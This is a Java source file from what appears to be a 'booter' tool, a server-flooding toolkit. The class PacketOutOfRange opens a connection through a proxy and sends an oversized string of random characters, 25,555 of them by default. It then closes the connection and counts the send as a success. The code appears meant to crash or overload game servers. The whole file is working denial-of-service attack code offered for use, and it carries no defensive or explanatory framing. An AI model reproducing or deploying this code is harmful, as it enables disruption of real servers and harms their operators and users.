package me.nzxtercode.nettybooter.methods.impl;

import java.io.IOException;
import java.security.SecureRandom;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.proxy.Proxy;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Packet out of range.
 */
public class PacketOutOfRange implements IMethod {
	/**
	 * The R.
	 */
	SecureRandom r = new SecureRandom();

	/**
	 * The Lol.
	 */
	String lol = "";

	/**
	 * The A.
	 */
	final int a = Integer.parseInt(System.getProperty("len", "25555"));

	/**
	 * Instantiates a new Packet out of range.
	 */
	public PacketOutOfRange() {
		for (int i = 1; i < this.a + 1; i++)
			this.lol = this.lol + (char) (this.r.nextInt(125) + 1);
	}

	public void accept(Channel channel, Proxy proxy) {
		ByteBuf b = Unpooled.buffer();
		
		ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
		
		try {
			bbbb.writeUTF(this.lol);
			bbbb.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		channel.writeAndFlush(b);
		
		NettyBootstrap.service.success++;
		
		channel.close();
	}
}
